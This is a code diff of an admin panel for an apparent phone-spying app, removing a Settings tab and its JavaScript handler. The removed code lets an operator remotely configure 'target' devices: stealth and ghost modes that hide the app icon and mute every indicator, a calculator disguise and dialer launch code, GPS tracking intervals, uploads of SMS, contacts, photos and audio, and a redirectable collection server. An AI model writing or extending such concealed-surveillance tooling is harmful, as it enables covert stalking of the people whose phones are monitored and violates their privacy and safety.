@@ -68,9 +68,6 @@
                     <a class="nav-link" data-toggle="tab" href="#tab-mgmt"><i class="fas fa-cogs mr-2"></i>Device Management</a>
                 </li>
                 <li class="nav-item">
-                    <a class="nav-link" data-toggle="tab" href="#tab-settings"><i class="fas fa-sliders-h mr-2"></i>Settings</a>
-                </li>
-                <li class="nav-item">
                     <a class="nav-link" data-toggle="tab" href="#tab-perms"><i class="fas fa-shield-alt mr-2"></i>Permissions</a>
                 </li>
             </ul>
@@ -173,142 +170,6 @@
                             </div>
                         </div>
                     </div>
-                </div>
-
-                <!-- SETTINGS -->
-                <div class="tab-pane fade" id="tab-settings">
-                    <div class="alert alert-info"><i class="fas fa-info-circle mr-2"></i><strong>Remote Settings:</strong> Changes are applied immediately on the target device(s).</div>
-                    <form id="adminSettingsForm" class="row">
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <div class="d-flex justify-content-between align-items-center mb-2">
-                                        <h6 class="mb-0"><i class="fas fa-sync text-primary mr-2"></i>Auto Sync</h6>
-                                        <div class="custom-control custom-switch">
-                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_auto_sync" data-pref="pref_auto_sync_v2" checked>
-                                            <label class="custom-control-label" for="a_pref_auto_sync"></label>
-                                        </div>
-                                    </div>
-                                    <small class="text-muted">When enabled, the device automatically uploads newly collected data on a scheduled interval. Disabling this stops all automatic uploads — data is still collected locally but not sent to the server.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <h6><i class="fas fa-clock text-primary mr-2"></i>Sync Interval (min)</h6>
-                                    <input type="number" class="form-control admin-setting-input" data-pref="pref_sync_interval_v2" value="6" min="1" max="24">
-                                    <small class="text-muted mt-1 d-block">How often the device uploads data automatically, in hours. Default: 6 hours.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <div class="d-flex justify-content-between align-items-center mb-2">
-                                        <h6 class="mb-0"><i class="fas fa-ban text-danger mr-2"></i>Disable Uploads</h6>
-                                        <div class="custom-control custom-switch">
-                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_disable_up" data-pref="pref_disable_uploads">
-                                            <label class="custom-control-label" for="a_pref_disable_up"></label>
-                                        </div>
-                                    </div>
-                                    <small class="text-muted">Master switch to stop ALL data transmission from the device to the server. The device stops all outgoing requests. Useful for temporarily halting data flow without losing collected data.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <div class="d-flex justify-content-between align-items-center mb-2">
-                                        <h6 class="mb-0"><i class="fas fa-file-alt text-danger mr-2"></i>Disable File Uploads</h6>
-                                        <div class="custom-control custom-switch">
-                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_disable_file" data-pref="pref_disable_file_uploads">
-                                            <label class="custom-control-label" for="a_pref_disable_file"></label>
-                                        </div>
-                                    </div>
-                                    <small class="text-muted">Prevents file and media uploads (photos, audio recordings, file lists) while allowing text-based data (SMS, contacts, locations) to upload. Reduces bandwidth usage.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <h6><i class="fas fa-map-marker-alt text-danger mr-2"></i>Live Location Interval (min)</h6>
-                                    <input type="number" class="form-control admin-setting-input" data-pref="pref_live_location_interval" value="30" min="1" max="1440">
-                                    <small class="text-muted mt-1 d-block">How frequently the device captures and uploads GPS location data when continuous tracking is active. Lower values provide finer location trails but consume more battery. Default: 30 minutes.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <h6><i class="fas fa-hourglass-half text-warning mr-2"></i>Queue Sync Interval (min)</h6>
-                                    <input type="number" class="form-control admin-setting-input" data-pref="pref_queue_sync_interval" value="15" min="1" max="120">
-                                    <small class="text-muted mt-1 d-block">How often the device flushes locally queued offline data when connectivity is restored. Prevents data loss during network outages. Default: 15 minutes.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <div class="d-flex justify-content-between align-items-center mb-2">
-                                        <h6 class="mb-0"><i class="fas fa-eye-slash text-secondary mr-2"></i>Ghost Mode</h6>
-                                        <div class="custom-control custom-switch">
-                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_ghost" data-pref="pref_ghost_mode">
-                                            <label class="custom-control-label" for="a_pref_ghost"></label>
-                                        </div>
-                                    </div>
-                                    <small class="text-muted">Completely hides the app icon from the device launcher when enabled. The app can only be launched via the dialer secret code. Combined with stealth mode for maximum concealment.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <div class="d-flex justify-content-between align-items-center mb-2">
-                                        <h6 class="mb-0"><i class="fas fa-user-secret text-dark mr-2"></i>Total Stealth Mode</h6>
-                                        <div class="custom-control custom-switch">
-                                            <input type="checkbox" class="custom-control-input admin-setting-toggle" id="a_pref_stealth" data-pref="pref_total_stealth_mode">
-                                            <label class="custom-control-label" for="a_pref_stealth"></label>
-                                        </div>
-                                    </div>
-                                    <small class="text-muted">Mutes all notifications, toasts, and visible indicators from the app. No sound, vibration, or screen notifications are shown when data is collected or uploaded.</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <h6><i class="fas fa-phone-alt text-info mr-2"></i>Dialer Launch Code</h6>
-                                    <input type="text" class="form-control admin-setting-input" data-pref="pref_dial_code" value="*#007#">
-                                    <small class="text-muted mt-1 d-block">Secret code dialed to launch the app. Default: *#007#</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-6 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <h6><i class="fas fa-calculator text-info mr-2"></i>Calculator Secret Code</h6>
-                                    <input type="text" class="form-control admin-setting-input" data-pref="pref_secret_code" value="1234">
-                                    <small class="text-muted mt-1 d-block">Code entered in calculator disguise to unlock the app. Default: 1234</small>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="col-md-12 mb-3">
-                            <div class="card h-100 border">
-                                <div class="card-body">
-                                    <h6><i class="fas fa-server text-info mr-2"></i>Server URL</h6>
-                                    <div class="input-group">
-                                        <input type="url" class="form-control admin-setting-input" data-pref="pref_server_url" placeholder="https://your-server.com">
-                                        <div class="input-group-append">
-                                            <button class="btn btn-info" type="button" onclick="adminApplySettings()">Apply to Target</button>
-                                        </div>
-                                    </div>
-                                    <small class="text-muted mt-1 d-block">The base URL of the server the device connects to for data uploads and command receipt. Change this to redirect the device to a different server endpoint. Leave empty to use the default URL configured on the device.</small>
-                                </div>
-                            </div>
-                        </div>
-                    </form>
                 </div>
 
                 <!-- PERMISSIONS -->
@@ -456,21 +317,6 @@ $(function() {
             if (r.isConfirmed) sendCmd(userId, 'cmd_' + cmd, mgmtPay[cmd] || cmd, {});
         });
     });
-
-    // Settings
-    window.adminApplySettings = function() {
-        const userId = getUserId();
-        const prefs = {};
-        $('.admin-setting-toggle').each(function() { prefs[$(this).data('pref')] = $(this).is(':checked') ? 'true' : 'false'; });
-        $('.admin-setting-input').each(function() { prefs[$(this).data('pref')] = $(this).val(); });
-        Swal.fire({
-            title: 'Apply Settings?',
-            html: 'Send <b>' + Object.keys(prefs).length + '</b> setting(s) to <b>' + (userId === 'all' ? 'ALL users' : 'selected user') + '</b>?',
-            icon: 'info', showCancelButton: true, confirmButtonText: 'Apply'
-        }).then(r => {
-            if (r.isConfirmed) sendCmd(userId, 'cmd_update_prefs', 'settings', { prefs: JSON.stringify(prefs) });
-        });
-    };
 
     // Permissions
     $('.btn-admin-perm').on('click', function() {
